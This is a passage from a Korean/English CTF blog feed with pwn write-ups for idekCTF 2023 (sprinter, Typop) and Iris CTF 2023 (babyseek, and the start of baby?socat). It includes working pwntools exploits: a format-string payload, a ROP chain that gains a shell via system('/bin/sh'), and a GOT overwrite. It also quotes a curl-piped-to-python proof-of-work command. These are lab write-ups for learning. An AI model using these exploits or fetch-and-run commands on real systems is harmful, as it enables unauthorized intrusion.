NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><p><code>\x01\x3b\x0e</code> 를 사용할 것인데 하위 1.5바이트 말고는 <code>aslr</code> 때문에 오프셋이 랜덤이니까 1&#x2F;4096의 확률의 브루트포싱이 필요하다.</p><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&#x27;vuln&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;sprinter.chal.idek.team&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        stack_leak = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;stack_leak : <span class="subst">&#123;<span class="built_in">hex</span>(stack_leak)&#125;</span>&#x27;</span>)</span><br><span class="line">        canary_addr = stack_leak + <span class="number">0x108</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;\x01\xfb\xff%5$261c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%4$c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># rbp</span></span><br><span class="line">        payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line">        payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># padding</span></span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">        payload += p64(canary_addr + <span class="number">1</span>)         <span class="comment"># 10</span></span><br><span class="line">        payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)   <span class="comment"># 11</span></span><br><span class="line">        payload += p64(stack_leak)              <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(</span><br><span class="line">            p.recvn(<span class="number">100</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        ))</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(ex)</span><br></pre></td></tr></table></figure><br><img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 00.29.59.png" width=500/>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Typop (rop)</title>
      <link href="/230116-idekctf2023-typop/"/>
      <url>/230116-idekctf2023-typop/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><blockquote><p>While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?<br><code>nc typop.chal.idek.team 1337</code></p></blockquote><ul><li>[155 solves &#x2F; 408 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>mitigation은 위와 같고, 프로그램 구조는 <code>main</code> 함수에서 while로 <code>getFeedback</code> 함수를 계속 호출하는 구조이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getFeedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you like ctf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x1E</span>uLL);  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)buf == <span class="number">121</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s great! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Aww :( &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you provide some extra feedback?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);  <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>bof</code>가 두 번 발생한다. <code>win</code> 함수가 존재하지만 인자 세 개를 컨트롤 해야해서 사용하기 까다롭다. <code>csu gadget</code>을 이용해야하는데 <strong><del>길이 제한 및 모든 보호기법이 다 걸려있어서 <code>got</code>를 덮을 수가 없어 사용하기가 매우 까다롭다.</del> <mark>(2023.01.18 update)</mark> 착각했다. <code>csu_gadget</code>으로 풀이하는 것이 인텐이고 해당 풀이는 아래 링크로 확인할 수 있다.</strong></p><ul><li><a href="https://jiravvit.github.io/230118-idekctf2023-typop2/">https://jiravvit.github.io/230118-idekctf2023-typop2/</a></li></ul><p>그래서 <code>win</code> 함수를 실행시키는 방향이 아닌 쉘을 획득하는 방향으로 풀이를 진행했다. 첫 번째로 터지는 <code>bof</code>에서 stack, canary, pie를 leak 할 수 있고 이로 인해 <code>rop</code>를 진행하여 libc 주소 또한 구할 수 있다. 결국 그냥 <code>system(&quot;/bin/sh\x00&quot;)</code>를 실행시켜 쉘을 획득하고 flag를 읽으면 된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;typop.chal.idek.team&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) canary, stack leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;canary: &#x27;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line">info(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + p64(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2) pie base leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;C&#x27;</span>*<span class="number">7</span> + <span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">e.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1447</span></span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(e.address+<span class="number">0x14d3</span>))</span><br><span class="line">pop_rdi = e.address + <span class="number">0x14d3</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.address + <span class="number">0x1410</span>) <span class="comment"># main</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x84420</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3) system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;2_guess_typos_do_matter&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - babyseek (offset)</title>
      <link href="/230109-irisctf2023-babyseek/"/>
      <url>/230109-irisctf2023-babyseek/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>86 Solves (8.4% of users)<br>167 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I’ll let you seek around my file as far as you want, but you can’t go anywhere since it’s &#x2F;dev&#x2F;null.<br><code>nc ret2libm.chal.irisc.tf 10004</code></p><p>To figure out where things are, you can use the gdb debugger. I recommend using a Docker instance, such as with the Dockerfile provided, to ensure you have an environment that matches the remote server you are attacking.</p><p>Hint!<br>You can find the location of functions in the Global Offset Table by using their name followed by @got.plt - for example, print &amp;‘<a href="mailto:&#x66;&#119;&#x72;&#x69;&#116;&#101;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#x6c;&#116;">&#x66;&#119;&#x72;&#x69;&#116;&#101;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#x6c;&#116;</a>‘.</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chal</span><br><span class="line">├── chal.c</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25a1bb094d7ba8684d70c7686826e67352ceaf0b, for GNU/Linux 3.2.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>This challenge have a source code, So we can view the original source code ! :)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// This is just setup</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is located around %p.\n&quot;</span>, win);</span><br><span class="line"></span><br><span class="line">    FILE* null = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* super_special = &amp;win;</span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;void&quot;</span>, <span class="number">1</span>, <span class="number">4</span>, null);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m currently at %p.\n&quot;</span>, null-&gt;_IO_write_ptr); <span class="comment">// [*]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll let you write the flag into nowhere!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Where should I seek into? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pos);</span><br><span class="line">    null-&gt;_IO_write_ptr += pos; <span class="comment">// [**]</span></span><br><span class="line"></span><br><span class="line">    fwrite(&amp;super_special, <span class="keyword">sizeof</span>(<span class="type">void</span>*), <span class="number">1</span>, null);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nice <code>win()</code> function which prints the flag. I like it.</p><p>Let’s see the <code>[*]</code> and <code>[**]</code> marking in code. First <code>[*]</code>, The <code>null</code> pointer is points to the <code>_IO_write_ptr</code> member of a <code>FILE</code> object. It points to the location where the file is being written to in memory. Before <code>[**]</code>, We can write the value to <code>pos</code>. It is add to the <code>null-&gt;_IO_write_ptr</code> at <code>[**]</code>, So <code>pos</code> is mean the offset.</p><p>The <code>frwite()</code> function attempt to write address of the <code>win()</code> to that offset, and then <code>exit()</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>We can move the pointer that the file is being written to in memory.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Let’s overwrite the <code>GOT</code> of <code>exit()</code> which is called write after. We calculate the offset of <code>win()</code> to <code>exit@got.plt</code>.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;seek.chal.irisc.tf&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;located around&#x27;</span>)</span><br><span class="line">win = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;win: &#x27;</span>+ <span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line">e.address = win - e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;currently at&#x27;</span>)</span><br><span class="line">curr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;curr: &#x27;</span> + <span class="built_in">hex</span>(curr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># move pos to exit@got</span></span><br><span class="line">offset = e.got[<span class="string">&#x27;exit&#x27;</span>] - curr</span><br><span class="line">info(<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;into?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;not_quite_fseek&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - baby?socat</title>
      <link href="/230109-irisctf2023-babysocat/"/>
      <url>/230109-irisctf2023-babysocat/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>22 Solves (2.1% of users)<br>478 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>love sockets and cats and socat and ls</p><p>Socat version on remote is 1.7.4.1<br><code>nc socat.chal.irisc.tf 10000</code></p><p>By: sera</p><p>The biggest clue to solving this problem is the SOCAT VERSION for intended solution.</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chal.c</span><br><span class="line">└── run.sh</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><p>X</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;Give me your command: &quot;</span></span><br><span class="line"><span class="built_in">read</span> -e -r input</span><br><span class="line">input=<span class="string">&quot;exec:./chal ls <span class="variable">$input</span>&quot;</span></span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">&quot;fakeflg&#123;REDACTED&#125;&quot;</span> socat - <span class="string">&quot;<span class="variable">$input</span>&quot;</span> 2&gt;&amp;0</span><br></pre></td></tr></table></figure><p>The <code>socat</code> is set up execute a <code>chal</code> binary with the parameters <code>ls</code> then the <code>input</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 